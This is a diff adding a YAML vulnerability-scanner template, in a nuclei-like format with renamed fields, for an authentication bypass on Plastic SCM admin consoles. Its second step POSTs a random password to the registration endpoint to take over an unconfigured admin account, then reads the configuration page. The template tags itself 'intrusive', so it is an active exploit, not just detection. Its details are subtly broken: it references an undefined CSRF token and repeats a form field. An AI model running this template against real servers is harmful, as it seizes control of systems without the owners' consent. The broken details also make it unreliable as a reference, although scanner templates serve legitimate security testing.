@@ -1,0 +1,55 @@
+id: unauthorized-plastic-scm
+brief:
+    title: Plastic Admin Console - Authentication Bypass
+    by: DEENA
+    level: critical
+    about: A Plastic Admin console was discovered.
+    label:
+        - plastic
+        - misconfig
+        - intrusive
+        - vuln
+    score: CVSS:10.0
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/account/register'
+      signs:
+        - "on": word
+          has:
+            - <title>Network - Plastic SCM</title>
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
+    - verb: POST
+      to:
+        - '{{BaseURL}}/account/register'
+      head:
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Origin: '{{Hostname}}'
+        Referer: '{{BaseURL}}/account/register'
+      body: Password={{randstr}}&ConfirmPassword={{randstr}}&RememberMe=true&__RequestVerificationToken={{csrf}}&RememberMe=false
+      signs:
+        - "on": word
+          has:
+            - <title>Network - Plastic SCM</title>
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
+    - verb: GET
+      to:
+        - '{{BaseURL}}/configuration'
+      signs:
+        - "on": word
+          has:
+            - <title>Network - Plastic SCM</title>
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
